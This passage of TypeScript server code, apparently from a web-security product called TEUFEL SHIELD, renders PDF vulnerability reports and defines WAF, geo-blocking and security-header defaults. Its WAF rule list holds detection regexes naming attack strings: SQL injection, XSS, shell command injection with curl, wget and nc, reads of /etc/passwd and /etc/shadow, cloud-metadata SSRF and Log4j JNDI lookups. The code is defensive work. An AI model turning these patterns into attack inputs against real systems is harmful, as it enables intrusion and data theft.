          doc.fillColor(navy).fontSize(8).font("Helvetica-Bold").text(`CVSS: ${v.cvss.score}`, 65, innerY);
          if (v.cvss.vector) doc.fillColor(gray).fontSize(7).font("Helvetica").text(v.cvss.vector, 130, innerY, { width: 250 });
          innerY += 13;
        }
        if (v.cwe) {
          doc.fillColor(accentBlue).fontSize(8).font("Helvetica").text(v.cwe, 65, innerY);
          if (v.owasp) doc.text(` | ${v.owasp}`, 65 + doc.widthOfString(v.cwe + "  "), innerY);
          innerY += 13;
        }
        
        // URL
        if (v.url) {
          doc.fillColor(gray).fontSize(8).font("Helvetica").text(`URL: ${v.url.substring(0, 90)}`, 65, innerY, { width: 465 });
          innerY += 13;
        }
        
        // Description
        if (v.description) {
          doc.fillColor("#334155").fontSize(8).font("Helvetica").text(v.description.substring(0, 180), 65, innerY, { width: 465 });
          innerY += 13;
        }
        
        // Recommendation
        if (v.recommendation) {
          doc.fillColor(green).fontSize(8).font("Helvetica-Bold").text("Recommendation: ", 65, innerY);
          doc.fillColor("#334155").font("Helvetica").text(v.recommendation.substring(0, 150), 65 + doc.widthOfString("Recommendation:  "), innerY, { width: 400 });
          innerY += 13;
        }
        
        // Evidence
        if (v.evidence) {
          doc.fillColor(orange).fontSize(7).font("Helvetica").text(`Evidence: ${String(v.evidence).substring(0, 100)}`, 65, innerY, { width: 465 });
          innerY += 13;
        }
        
        yPos += needHeight + 8;
      }
      
      if (vulns.length > 50) {
        doc.fillColor(gray).fontSize(9).text(`Showing top 50 of ${vulns.length} findings. See full results in dashboard.`, 50, yPos + 5);
      }
      
      // ── Network Reconnaissance Page ──
      const hasPorts = scanResult.openPorts && scanResult.openPorts.length > 0;
      const hasDns = scanResult.dnsRecords && scanResult.dnsRecords.length > 0;
      const hasSubdomains = scanResult.subdomains && scanResult.subdomains.length > 0;
      const hasDirs = scanResult.directories && scanResult.directories.length > 0;
      const hasAdminPanels = scanResult.adminPanels && scanResult.adminPanels.length > 0;
      
      if (hasPorts || hasDns || hasSubdomains || hasDirs || hasAdminPanels) {
        doc.addPage();
        doc.rect(0, 0, 595, 45).fill(navy);
        doc.fillColor(white).fontSize(12).font("Helvetica-Bold").text("TEUFEL SHIELD - Vulnerability Assessment Report", 50, 14);
        doc.fillColor("#94a3b8").fontSize(8).text("Network Reconnaissance", 400, 16);
        
        yPos = 65;
        doc.fillColor(navy).fontSize(18).font("Helvetica-Bold").text("Network Reconnaissance", 50, yPos);
        yPos += 25;
        doc.moveTo(50, yPos).lineTo(545, yPos).lineWidth(1).strokeColor(accentBlue).stroke();
        yPos += 15;
        
        // Open Ports
        if (hasPorts) {
          doc.fillColor(navy).fontSize(12).font("Helvetica-Bold").text("Open Ports", 50, yPos);
          yPos += 18;
          // Table header
          doc.rect(50, yPos, 495, 18).fill(navy);
          doc.fillColor(white).fontSize(8).font("Helvetica-Bold");
          doc.text("Port", 60, yPos + 4); doc.text("Service", 120, yPos + 4); doc.text("State", 250, yPos + 4); doc.text("Risk", 350, yPos + 4);
          yPos += 18;
          
          scanResult.openPorts.slice(0, 20).forEach((p: any) => {
            if (yPos > 750) return;
            const bg = yPos % 2 === 0 ? lightGray : white;
            doc.rect(50, yPos, 495, 16).fill(bg);
            doc.fillColor("#334155").fontSize(8).font("Helvetica");
            doc.text(String(p.port), 60, yPos + 3); doc.text(p.service || "Unknown", 120, yPos + 3);
            doc.text(p.state || "Open", 250, yPos + 3);
            const pColor = p.risk === "critical" ? red : p.risk === "high" ? orange : gray;
            doc.fillColor(pColor).text((p.risk || "info").toUpperCase(), 350, yPos + 3);
            yPos += 16;
          });
          yPos += 15;
        }
        
        // DNS Records
        if (hasDns) {
          if (yPos > 650) { doc.addPage(); yPos = 60; }
          doc.fillColor(navy).fontSize(12).font("Helvetica-Bold").text("DNS Records", 50, yPos);
          yPos += 18;
          doc.rect(50, yPos, 495, 18).fill(navy);
          doc.fillColor(white).fontSize(8).font("Helvetica-Bold");
          doc.text("Type", 60, yPos + 4); doc.text("Name", 120, yPos + 4); doc.text("Value", 280, yPos + 4);
          yPos += 18;
          scanResult.dnsRecords.slice(0, 15).forEach((r: any) => {
            if (yPos > 750) return;
            doc.rect(50, yPos, 495, 16).fill(lightGray);
            doc.fillColor("#334155").fontSize(8).font("Helvetica");
            doc.text(r.type || "", 60, yPos + 3); doc.text((r.name || "").substring(0, 25), 120, yPos + 3);
            doc.text((r.value || r.data || "").substring(0, 50), 280, yPos + 3, { width: 250 });
            yPos += 16;
          });
          yPos += 15;
        }
        
        // Subdomains
        if (hasSubdomains) {
          if (yPos > 650) { doc.addPage(); yPos = 60; }
          doc.fillColor(navy).fontSize(12).font("Helvetica-Bold").text(`Subdomains (${scanResult.subdomains.length} found)`, 50, yPos);
          yPos += 18;
          scanResult.subdomains.slice(0, 15).forEach((s: any) => {
            if (yPos > 750) return;
            doc.fillColor(accentBlue).fontSize(8).text("●", 55, yPos);
            doc.fillColor("#334155").fontSize(8).font("Helvetica").text(typeof s === 'string' ? s : (s.domain || s.subdomain || ''), 70, yPos, { width: 475 });
            yPos += 14;
          });
          yPos += 15;
        }
        
        // Admin Panels
        if (hasAdminPanels) {
          if (yPos > 650) { doc.addPage(); yPos = 60; }
          doc.fillColor(navy).fontSize(12).font("Helvetica-Bold").text(`Admin Panels Found (${scanResult.adminPanels.length})`, 50, yPos);
          yPos += 18;
          scanResult.adminPanels.slice(0, 10).forEach((panel: any) => {
            if (yPos > 750) return;
            doc.fillColor(orange).fontSize(8).text("⚠", 55, yPos);
            doc.fillColor("#334155").fontSize(8).font("Helvetica").text(typeof panel === 'string' ? panel : (panel.url || panel.path || ''), 70, yPos, { width: 475 });
            yPos += 14;
          });
          yPos += 15;
        }
        
        // Directories
        if (hasDirs) {
          if (yPos > 650) { doc.addPage(); yPos = 60; }
          doc.fillColor(navy).fontSize(12).font("Helvetica-Bold").text(`Exposed Directories (${scanResult.directories.length})`, 50, yPos);
          yPos += 18;
          scanResult.directories.slice(0, 15).forEach((d: any) => {
            if (yPos > 750) return;
            doc.fillColor(gray).fontSize(8).text("→", 55, yPos);
            doc.fillColor("#334155").fontSize(8).font("Helvetica").text(typeof d === 'string' ? d : (d.path || d.url || ''), 70, yPos, { width: 400 });
            if (typeof d === 'object' && d.status) doc.fillColor(gray).text(`[${d.status}]`, 480, yPos);
            yPos += 14;
          });
        }
      }
      
      // ── OWASP Summary Page ──
      doc.addPage();
      doc.rect(0, 0, 595, 45).fill(navy);
      doc.fillColor(white).fontSize(12).font("Helvetica-Bold").text("TEUFEL SHIELD - Vulnerability Assessment Report", 50, 14);
      doc.fillColor("#94a3b8").fontSize(8).text("OWASP Classification", 400, 16);
      
      yPos = 65;
      doc.fillColor(navy).fontSize(18).font("Helvetica-Bold").text("OWASP Top 10 Classification", 50, yPos);
      yPos += 25;
      doc.moveTo(50, yPos).lineTo(545, yPos).lineWidth(1).strokeColor(accentBlue).stroke();
      yPos += 15;
      
      // Count per OWASP category
      const owaspCounts: Record<string, number> = {};
      vulns.forEach((v: any) => {
        const cat = v.owasp || "Unclassified";
        owaspCounts[cat] = (owaspCounts[cat] || 0) + 1;
      });
      
      const owaspTop10 = [
        { id: "A01:2021", name: "Broken Access Control" },
        { id: "A02:2021", name: "Cryptographic Failures" },
        { id: "A03:2021", name: "Injection" },
        { id: "A04:2021", name: "Insecure Design" },
        { id: "A05:2021", name: "Security Misconfiguration" },
        { id: "A06:2021", name: "Vulnerable Components" },
        { id: "A07:2021", name: "Auth Failures" },
        { id: "A08:2021", name: "Software & Data Integrity" },
        { id: "A09:2021", name: "Logging & Monitoring" },
        { id: "A10:2021", name: "SSRF" },
      ];
      
      owaspTop10.forEach((cat) => {
        const count = Object.entries(owaspCounts)
          .filter(([k]) => k.includes(cat.id))
          .reduce((sum, [, v]) => sum + v, 0);
        
        doc.rect(50, yPos, 495, 28).fill(count > 0 ? "#fef2f2" : lightGray).strokeColor("#e2e8f0").lineWidth(0.5).stroke();
        doc.fillColor(navy).fontSize(9).font("Helvetica-Bold").text(`${cat.id} - ${cat.name}`, 65, yPos + 8, { width: 350 });
        
        if (count > 0) {
          doc.rect(460, yPos + 5, 70, 16).fill(red);
          doc.fillColor(white).fontSize(8).font("Helvetica-Bold").text(`${count} found`, 460, yPos + 9, { width: 70, align: "center" });
        } else {
          doc.rect(460, yPos + 5, 70, 16).fill(green);
          doc.fillColor(white).fontSize(8).font("Helvetica-Bold").text("PASS", 460, yPos + 9, { width: 70, align: "center" });
        }
        yPos += 32;
      });
      
      // ── Recommendations Page ──
      yPos += 20;
      if (yPos > 550) { doc.addPage(); yPos = 60; }
      
      doc.fillColor(navy).fontSize(16).font("Helvetica-Bold").text("Remediation Priorities", 50, yPos);
      yPos += 25;
      
      const priorities = [];
      if (lang === "de") {
        if (critical > 0) priorities.push({ level: "KRITISCH", color: red, text: `${critical} kritische Schwachstellen SOFORT beheben. Diese ermoeglichen Remote Code Execution, Datendiebstahl oder vollstaendige Systemkompromittierung.` });
        if (high > 0) priorities.push({ level: "HOCH", color: orange, text: `${high} hohe Schwachstellen innerhalb von 7 Tagen beheben. Diese stellen ein erhebliches Risiko dar.` });
        if (medium > 0) priorities.push({ level: "MITTEL", color: yellow, text: `${medium} mittlere Schwachstellen innerhalb von 30 Tagen beheben.` });
        if (low > 0) priorities.push({ level: "NIEDRIG", color: green, text: `${low} niedrige Schwachstellen bei naechster Sicherheitspruefung ueberpruefen.` });
        priorities.push({ level: "LAUFEND", color: accentBlue, text: "Kontinuierliches Sicherheitsmonitoring mit regelmaessigen automatisierten Scans implementieren." });
      } else {
        if (critical > 0) priorities.push({ level: "CRITICAL", color: red, text: `Fix ${critical} critical vulnerabilities IMMEDIATELY. These allow remote code execution, data theft, or full system compromise.` });
        if (high > 0) priorities.push({ level: "HIGH", color: orange, text: `Remediate ${high} high-severity issues within 7 days. These pose significant risk to confidentiality and integrity.` });
        if (medium > 0) priorities.push({ level: "MEDIUM", color: yellow, text: `Address ${medium} medium-severity findings within 30 days during regular maintenance cycles.` });
        if (low > 0) priorities.push({ level: "LOW", color: green, text: `Review ${low} low-severity observations during next security review. These are best-practice improvements.` });
        priorities.push({ level: "ONGOING", color: accentBlue, text: "Implement continuous security monitoring with regular automated scans. Train development team on secure coding practices." });
      }
      
      priorities.forEach(p => {
        doc.rect(50, yPos, 70, 35).fill(p.color);
        doc.fillColor(white).fontSize(9).font("Helvetica-Bold").text(p.level, 50, yPos + 12, { width: 70, align: "center" });
        doc.fillColor("#334155").fontSize(9).font("Helvetica").text(p.text, 130, yPos + 8, { width: 410, lineGap: 2 });
        yPos += 42;
      });
      
      // ── AI Analysis Page ──
      if (scanResult.aiAnalysis) {
        doc.addPage();
        doc.rect(0, 0, 595, 45).fill(navy);
        doc.fillColor(white).fontSize(12).font("Helvetica-Bold").text("TEUFEL SHIELD - " + (lang === "de" ? "KI-Sicherheitsanalyse" : "AI Security Analysis"), 50, 14);
        
        doc.fillColor(navy).fontSize(16).font("Helvetica-Bold").text(lang === "de" ? "KI-Analyse der Ergebnisse" : "AI Analysis of Results", 50, 65);
        doc.moveTo(50, 85).lineTo(545, 85).lineWidth(1).strokeColor("#ff6600").stroke();
        
        // Split AI analysis into lines and render
        const aiLines = scanResult.aiAnalysis.split("\n");
        let aiY = 95;
        for (const line of aiLines) {
          if (aiY > 780) { doc.addPage(); aiY = 50; }
          
          if (line.includes("━") || line.includes("═")) {
            doc.fillColor(accentBlue).fontSize(8).font("Helvetica").text(line, 50, aiY, { width: 495 });
          } else if (line.match(/^\d+\.\s/)) {
            doc.fillColor(navy).fontSize(11).font("Helvetica-Bold").text(line, 50, aiY, { width: 495 });
          } else if (line.includes("[KRITISCH]") || line.includes("[CRITICAL]")) {
            doc.fillColor(red).fontSize(9).font("Helvetica-Bold").text(line, 55, aiY, { width: 490 });
          } else if (line.includes("[HOCH]") || line.includes("[HIGH]")) {
            doc.fillColor(orange).fontSize(9).font("Helvetica-Bold").text(line, 55, aiY, { width: 490 });
          } else if (line.includes("[MITTEL]") || line.includes("[MEDIUM]")) {
            doc.fillColor(yellow).fontSize(9).font("Helvetica").text(line, 55, aiY, { width: 490 });
          } else {
            doc.fillColor("#334155").fontSize(9).font("Helvetica").text(line, 55, aiY, { width: 490 });
          }
          aiY += line.trim() === "" ? 8 : 13;
        }
      }
      
      // ── Footer on all pages ──
      const pageRange = doc.bufferedPageRange();
      for (let i = 0; i < pageRange.count; i++) {
        doc.switchToPage(i);
        if (i > 0) { // Skip cover page
          doc.fillColor("#94a3b8").fontSize(7).font("Helvetica");
          doc.text("TEUFEL SHIELD | GAP Protection | gap-protection.pro | " + (lang === "de" ? "VERTRAULICH" : "CONFIDENTIAL"), 50, 805, { width: 495, align: "center" });
          doc.text(`${lang === "de" ? "Seite" : "Page"} ${i + 1} ${lang === "de" ? "von" : "of"} ${pageRange.count}`, 50, 815, { width: 495, align: "center" });
        }
      }
      
      doc.end();
      const pdfBuffer = await pdfReady;
      
      res.setHeader("Content-Type", "application/pdf");
      res.setHeader("Content-Disposition", `attachment; filename="TEUFEL-Shield-Report-${lang.toUpperCase()}-${Date.now()}.pdf"`);
      res.send(pdfBuffer);
    } catch (error: any) {
      console.error("PDF generation error:", error);
      res.status(500).json({ error: "Failed to generate PDF report" });
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════════
  // TEUFEL SHIELD - WAF & PROTECTION API
  // ═══════════════════════════════════════════════════════════════════════════════

  interface ProtectedDomain {
    id: string;
    domain: string;
    originIp: string;
    proxyIp: string;
    status: "active" | "paused" | "error";
    wafEnabled: boolean;
    ddosProtection: boolean;
    botProtection: boolean;
    rateLimit: number;
    blockedRequests: number;
    totalRequests: number;
    sslEnabled: boolean;
    createdAt: string;
  }

  interface WAFRule {
    id: string;
    name: string;
    type: string;
    pattern: string;
    action: "block" | "challenge" | "log";
    enabled: boolean;
    hits: number;
  }

  interface ThreatLog {
    id: string;
    timestamp: string;
    type: string;
    sourceIp: string;
    country: string;
    path: string;
    action: "blocked" | "challenged" | "allowed";
    severity: "critical" | "high" | "medium" | "low";
  }

  interface IPEntry {
    id: string;
    ip: string;
    type: "blacklist" | "whitelist";
    reason: string;
    addedAt: string;
    expiresAt?: string;
    hits: number;
  }

  interface GeoRule {
    id: string;
    countryCode: string;
    countryName: string;
    action: "block" | "challenge" | "allow";
    enabled: boolean;
  }

  interface RateLimitRule {
    id: string;
    name: string;
    path: string;
    requestsPerMinute: number;
    blockDuration: number;
    enabled: boolean;
    triggered: number;
  }

  interface SecurityHeader {
    id: string;
    name: string;
    value: string;
    enabled: boolean;
    description: string;
  }

  interface BruteForceRule {
    id: string;
    name: string;
    path: string;
    maxAttempts: number;
    lockoutDuration: number;
    enabled: boolean;
    blocked: number;
  }

  interface IPReputation {
    ip: string;
    score: number;
    category: "clean" | "suspicious" | "malicious" | "tor" | "vpn" | "proxy" | "datacenter";
    lastSeen: string;
    totalRequests: number;
    blockedRequests: number;
    country: string;
  }

  interface Honeypot {
    id: string;
    path: string;
    type: "admin" | "login" | "api" | "backup" | "config";
    triggered: number;
    enabled: boolean;
  }

  interface BotScore {
    ip: string;
    score: number;
    isBot: boolean;
    botType?: "crawler" | "scraper" | "scanner" | "spam" | "unknown";
    fingerprint: string;
    lastSeen: string;
  }

  // NOTE: All Shield data is now stored in PostgreSQL database (see seedDatabase function below)
  // The database tables are: dbProtectedDomains, dbWafRules, dbIpList, dbGeoRules, 
  // dbRateLimitRules, dbSecurityHeaders, dbBruteForceRules, dbHoneypots, 
  // dbIpReputations, dbBotScores, dbThreatLogs

  // ═══════════════════════════════════════════════════════════════════════════════
  // TEUFEL ULTIMATE WAF - 50+ PROFESSIONAL ATTACK SIGNATURES (KEINE GRENZEN!)
  // ═══════════════════════════════════════════════════════════════════════════════
  const defaultWafRules: WAFRule[] = [
    // ═══ SQL INJECTION VARIANTS ═══
    { id: "sqli-union", name: "SQLi - Union Attack", type: "sqli", pattern: "(?i)(union\\s+(all\\s+)?select)", action: "block", enabled: true, hits: 0 },
    { id: "sqli-time", name: "SQLi - Time-Based Blind", type: "sqli", pattern: "(?i)(sleep\\(|waitfor\\s+delay|benchmark\\(|pg_sleep)", action: "block", enabled: true, hits: 0 },
    { id: "sqli-error", name: "SQLi - Error-Based", type: "sqli", pattern: "(?i)(extractvalue|updatexml|floor\\(rand|exp\\(~)", action: "block", enabled: true, hits: 0 },
    { id: "sqli-stacked", name: "SQLi - Stacked Queries", type: "sqli", pattern: "(?i)(;\\s*(select|insert|update|delete|drop|create|alter|truncate))", action: "block", enabled: true, hits: 0 },
    { id: "sqli-comment", name: "SQLi - Comment Bypass", type: "sqli", pattern: "(?i)(/\\*.*\\*/|--\\s|#\\s|;--)", action: "block", enabled: true, hits: 0 },
    { id: "sqli-hex", name: "SQLi - Hex Encoding", type: "sqli", pattern: "(?i)(0x[0-9a-f]{8,}|char\\(|ascii\\(|ord\\()", action: "block", enabled: true, hits: 0 },
    { id: "sqli-auth", name: "SQLi - Auth Bypass", type: "sqli", pattern: "(?i)('\\s*or\\s+'|\"\\s*or\\s+\"|'\\s*=\\s*'|1\\s*=\\s*1)", action: "block", enabled: true, hits: 0 },
    
    // ═══ XSS VARIANTS ═══
    { id: "xss-script", name: "XSS - Script Tag", type: "xss", pattern: "(?i)(<script[^>]*>|</script>)", action: "block", enabled: true, hits: 0 },
    { id: "xss-event", name: "XSS - Event Handlers", type: "xss", pattern: "(?i)(on(error|load|click|mouse|focus|blur|key|submit|change|input)\\s*=)", action: "block", enabled: true, hits: 0 },
    { id: "xss-proto", name: "XSS - Protocol Handlers", type: "xss", pattern: "(?i)(javascript:|vbscript:|data:text/html|data:application)", action: "block", enabled: true, hits: 0 },
    { id: "xss-svg", name: "XSS - SVG/XML Attacks", type: "xss", pattern: "(?i)(<svg|<math|<xml|<xsl|<xss)", action: "block", enabled: true, hits: 0 },
    { id: "xss-img", name: "XSS - Image Tag Attacks", type: "xss", pattern: "(?i)(<img[^>]+(onerror|onload|src\\s*=\\s*[\"']?javascript))", action: "block", enabled: true, hits: 0 },
    { id: "xss-iframe", name: "XSS - IFrame Injection", type: "xss", pattern: "(?i)(<iframe|<frame|<embed|<object|<applet)", action: "block", enabled: true, hits: 0 },
    { id: "xss-dom", name: "XSS - DOM Manipulation", type: "xss", pattern: "(?i)(document\\.(write|cookie|domain)|innerHTML|outerHTML|insertAdjacentHTML)", action: "block", enabled: true, hits: 0 },
    { id: "xss-eval", name: "XSS - Eval Attacks", type: "xss", pattern: "(?i)(eval\\(|setTimeout\\(|setInterval\\(|Function\\(|new\\s+Function)", action: "block", enabled: true, hits: 0 },
    
    // ═══ REMOTE CODE EXECUTION ═══
    { id: "rce-cmd", name: "RCE - Command Injection", type: "rce", pattern: "(?i)(;\\s*(ls|cat|wget|curl|nc|bash|sh|cmd|powershell)\\s)", action: "block", enabled: true, hits: 0 },
    { id: "rce-php", name: "RCE - PHP Functions", type: "rce", pattern: "(?i)(eval\\(|system\\(|exec\\(|passthru\\(|shell_exec\\(|popen\\(|proc_open)", action: "block", enabled: true, hits: 0 },
    { id: "rce-python", name: "RCE - Python Injection", type: "rce", pattern: "(?i)(os\\.system|subprocess|__import__|eval\\(|exec\\()", action: "block", enabled: true, hits: 0 },
    { id: "rce-node", name: "RCE - Node.js Injection", type: "rce", pattern: "(?i)(child_process|require\\(['\"]child_process|spawn\\(|execSync)", action: "block", enabled: true, hits: 0 },
    { id: "rce-shell", name: "RCE - Shell Metacharacters", type: "rce", pattern: "(\\||&&|\\$\\(|`|>|<|\\\\n|\\\\r)", action: "block", enabled: true, hits: 0 },
    
    // ═══ PATH TRAVERSAL / LFI ═══
    { id: "lfi-basic", name: "LFI - Path Traversal", type: "lfi", pattern: "(?i)(\\.\\./|\\.\\.\\\\|%2e%2e%2f|%2e%2e/|\\.\\.%2f)", action: "block", enabled: true, hits: 0 },
    { id: "lfi-linux", name: "LFI - Linux Files", type: "lfi", pattern: "(?i)(/etc/(passwd|shadow|hosts|issue)|/proc/(self|version|cmdline))", action: "block", enabled: true, hits: 0 },
    { id: "lfi-windows", name: "LFI - Windows Files", type: "lfi", pattern: "(?i)(c:\\\\windows|c:\\\\boot\\.ini|c:\\\\inetpub|\\\\\\\\)", action: "block", enabled: true, hits: 0 },
    { id: "lfi-logs", name: "LFI - Log Poisoning", type: "lfi", pattern: "(?i)(/var/log/|access\\.log|error\\.log|apache2)", action: "block", enabled: true, hits: 0 },
    { id: "rfi-remote", name: "RFI - Remote Include", type: "rfi", pattern: "(?i)(=\\s*(http|https|ftp|php|data|expect|input)://)", action: "block", enabled: true, hits: 0 },
    
    // ═══ SERVER-SIDE ATTACKS ═══
    { id: "xxe-entity", name: "XXE - Entity Injection", type: "xxe", pattern: "(?i)(<!ENTITY|<!DOCTYPE.*\\[|SYSTEM\\s*[\"'])", action: "block", enabled: true, hits: 0 },
    { id: "xxe-param", name: "XXE - Parameter Entity", type: "xxe", pattern: "(?i)(%[a-z]+;|<!ENTITY\\s+%)", action: "block", enabled: true, hits: 0 },
    { id: "ssrf-internal", name: "SSRF - Internal Networks", type: "ssrf", pattern: "(?i)(127\\.0\\.0\\.|10\\.|172\\.(1[6-9]|2[0-9]|3[0-1])\\.|192\\.168\\.)", action: "block", enabled: true, hits: 0 },
    { id: "ssrf-cloud", name: "SSRF - Cloud Metadata", type: "ssrf", pattern: "(?i)(169\\.254\\.169\\.254|metadata\\.google|169\\.254\\.170\\.2)", action: "block", enabled: true, hits: 0 },
    { id: "ssti-jinja", name: "SSTI - Jinja/Twig", type: "ssti", pattern: "(\\{\\{.*\\}\\}|\\{%.*%\\}|\\$\\{.*\\})", action: "block", enabled: true, hits: 0 },
    { id: "ssti-java", name: "SSTI - Java/Freemarker", type: "ssti", pattern: "(?i)(\\$\\{.*\\}|#\\{.*\\}|<#.*>|\\[#.*\\])", action: "block", enabled: true, hits: 0 },
    
    // ═══ NOSQL & DATABASE ATTACKS ═══
    { id: "nosql-mongo", name: "NoSQL - MongoDB Operators", type: "nosql", pattern: "(?i)(\\$where|\\$regex|\\$ne|\\$gt|\\$lt|\\$or|\\$and|\\$in|\\$nin)", action: "block", enabled: true, hits: 0 },
    { id: "nosql-json", name: "NoSQL - JSON Injection", type: "nosql", pattern: "(\\{\\s*[\"']?\\$)", action: "block", enabled: true, hits: 0 },
    { id: "ldap-inject", name: "LDAP Injection", type: "ldap", pattern: "(?i)(\\)\\(|\\(\\||\\(&|\\*\\)|\\)\\*)", action: "block", enabled: true, hits: 0 },
    { id: "xpath-inject", name: "XPath Injection", type: "xpath", pattern: "(?i)('\\s*or\\s+'|and\\s+1=1|'\\]\\[|\\[position)", action: "block", enabled: true, hits: 0 },
    
    // ═══ ZERO-DAY & MODERN ATTACKS ═══
    { id: "log4j-jndi", name: "Log4j - JNDI Lookup", type: "log4j", pattern: "(?i)(\\$\\{jndi:|\\$\\{lower:|\\$\\{upper:|\\$\\{env:)", action: "block", enabled: true, hits: 0 },
    { id: "log4j-bypass", name: "Log4j - Bypass Variants", type: "log4j", pattern: "(?i)(\\$\\{[^}]*j[^}]*n[^}]*d[^}]*i)", action: "block", enabled: true, hits: 0 },
    { id: "spring4shell", name: "Spring4Shell RCE", type: "rce", pattern: "(?i)(class\\.module\\.classLoader)", action: "block", enabled: true, hits: 0 },
    { id: "proto-pollution", name: "Prototype Pollution", type: "proto", pattern: "(?i)(__proto__|constructor\\.prototype|Object\\.prototype)", action: "block", enabled: true, hits: 0 },
    { id: "graphql-inject", name: "GraphQL Injection", type: "graphql", pattern: "(?i)(__schema|__type|introspection|mutation\\s*\\{)", action: "challenge", enabled: true, hits: 0 },
    
    // ═══ SCANNER & BOT DETECTION ═══
    { id: "scanner-tools", name: "Scanner - Hacking Tools", type: "scanner", pattern: "(?i)(nikto|sqlmap|nmap|burp|zap|acunetix|nessus|openvas|nuclei)", action: "block", enabled: true, hits: 0 },
    { id: "scanner-wfuzz", name: "Scanner - Fuzzing Tools", type: "scanner", pattern: "(?i)(wfuzz|ffuf|gobuster|dirbuster|dirb|feroxbuster)", action: "block", enabled: true, hits: 0 },
    { id: "scanner-bots", name: "Scanner - Malicious Bots", type: "bot", pattern: "(?i)(masscan|shodan|censys|zoomeye|crawler|spider|scraper)", action: "challenge", enabled: true, hits: 0 },
    { id: "scanner-ua", name: "Scanner - Fake User-Agents", type: "bot", pattern: "(?i)(python-requests|curl/|wget/|libwww|httpie|axios/)", action: "challenge", enabled: true, hits: 0 },
    
    // ═══ HEADER & INJECTION ATTACKS ═══
    { id: "crlf-inject", name: "CRLF Injection", type: "crlf", pattern: "(%0d%0a|%0a|%0d|\\\\r\\\\n|\\\\n)", action: "block", enabled: true, hits: 0 },
    { id: "host-inject", name: "Host Header Injection", type: "header", pattern: "(?i)(X-Forwarded-Host:|X-Original-URL:|X-Rewrite-URL:)", action: "challenge", enabled: true, hits: 0 },
    { id: "smuggle", name: "HTTP Smuggling", type: "smuggle", pattern: "(?i)(Transfer-Encoding:\\s*chunked.*Content-Length|Content-Length.*Transfer-Encoding)", action: "block", enabled: true, hits: 0 },
    
    // ═══ AUTHENTICATION ATTACKS ═══
    { id: "jwt-none", name: "JWT None Algorithm", type: "jwt", pattern: "(?i)(\"alg\"\\s*:\\s*\"none\"|eyJ[A-Za-z0-9_-]*\\.\\s*\\.)", action: "block", enabled: true, hits: 0 },
    { id: "jwt-weak", name: "JWT Weak Secret", type: "jwt", pattern: "(?i)(\"alg\"\\s*:\\s*\"HS256\"|\"secret\"\\s*:|password)", action: "challenge", enabled: true, hits: 0 },
  ];

  const defaultGeoRules: GeoRule[] = [
    { id: "cn", countryCode: "CN", countryName: "China", action: "challenge", enabled: false },
    { id: "ru", countryCode: "RU", countryName: "Russia", action: "challenge", enabled: false },
    { id: "kp", countryCode: "KP", countryName: "North Korea", action: "block", enabled: true },
    { id: "ir", countryCode: "IR", countryName: "Iran", action: "challenge", enabled: false },
    { id: "sy", countryCode: "SY", countryName: "Syria", action: "challenge", enabled: false },
    { id: "ua", countryCode: "UA", countryName: "Ukraine", action: "allow", enabled: true },
    { id: "us", countryCode: "US", countryName: "United States", action: "allow", enabled: true },
    { id: "de", countryCode: "DE", countryName: "Germany", action: "allow", enabled: true },
    { id: "gb", countryCode: "GB", countryName: "United Kingdom", action: "allow", enabled: true },
    { id: "fr", countryCode: "FR", countryName: "France", action: "allow", enabled: true },
  ];

  // ═══════════════════════════════════════════════════════════════════════════════
  // TEUFEL SECURITY HEADERS - MAXIMUM BROWSER PROTECTION (ULTIMATIVE SICHERHEIT!)
  // ═══════════════════════════════════════════════════════════════════════════════
  const defaultSecurityHeaders: SecurityHeader[] = [
    // ═══ ESSENTIAL SECURITY HEADERS ═══
    { id: "xfo", name: "X-Frame-Options", value: "DENY", enabled: true, description: "Verhindert Clickjacking durch Deaktivierung von Iframe-Einbettung" },
    { id: "xcto", name: "X-Content-Type-Options", value: "nosniff", enabled: true, description: "Verhindert MIME-Type-Sniffing-Angriffe" },
    { id: "xxp", name: "X-XSS-Protection", value: "1; mode=block", enabled: true, description: "Aktiviert Browser-XSS-Filter" },
    { id: "hsts", name: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload", enabled: true, description: "Erzwingt HTTPS mit 2-Jahres-Gültigkeit und Preload" },
    { id: "rp", name: "Referrer-Policy", value: "strict-origin-when-cross-origin", enabled: true, description: "Kontrolliert Referrer-Informationen" },
    
    // ═══ CONTENT SECURITY POLICY ═══
    { id: "csp", name: "Content-Security-Policy", value: "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'", enabled: true, description: "Umfassende CSP-Richtlinie gegen XSS/Injection" },
    { id: "csp-ro", name: "Content-Security-Policy-Report-Only", value: "default-src 'self'; report-uri /api/csp-report", enabled: false, description: "CSP-Berichtsmodus für Überwachung" },
    
    // ═══ PERMISSIONS & FEATURES ═══
    { id: "pp", name: "Permissions-Policy", value: "geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()", enabled: true, description: "Deaktiviert gefährliche Browser-APIs" },
    { id: "fp", name: "Feature-Policy", value: "geolocation 'none'; microphone 'none'; camera 'none'", enabled: true, description: "Legacy-Feature-Policy für ältere Browser" },
    
    // ═══ CROSS-ORIGIN ISOLATION ═══
    { id: "coep", name: "Cross-Origin-Embedder-Policy", value: "require-corp", enabled: true, description: "Verhindert Laden von Cross-Origin-Ressourcen" },
    { id: "coop", name: "Cross-Origin-Opener-Policy", value: "same-origin", enabled: true, description: "Isoliert Browsing-Kontext" },
    { id: "corp", name: "Cross-Origin-Resource-Policy", value: "same-origin", enabled: true, description: "Verhindert Cross-Origin-Ressourcen-Lecks" },
    
    // ═══ CACHE & DOWNLOAD SECURITY ═══
    { id: "pragma", name: "Pragma", value: "no-cache", enabled: true, description: "Verhindert Caching sensibler Daten" },
    { id: "cache", name: "Cache-Control", value: "no-store, no-cache, must-revalidate, private", enabled: true, description: "Strenge Cache-Kontrolle" },
    { id: "xdl", name: "X-Download-Options", value: "noopen", enabled: true, description: "Verhindert automatisches Öffnen von Downloads" },
    { id: "xpcdp", name: "X-Permitted-Cross-Domain-Policies", value: "none", enabled: true, description: "Blockiert Cross-Domain-Policy-Dateien" },
    
    // ═══ ADDITIONAL PROTECTION ═══
    { id: "xdns", name: "X-DNS-Prefetch-Control", value: "off", enabled: true, description: "Deaktiviert DNS-Prefetching" },
    { id: "xpb", name: "X-Powered-By", value: "TEUFEL-SHIELD", enabled: true, description: "Versteckt Server-Technologie-Informationen" },
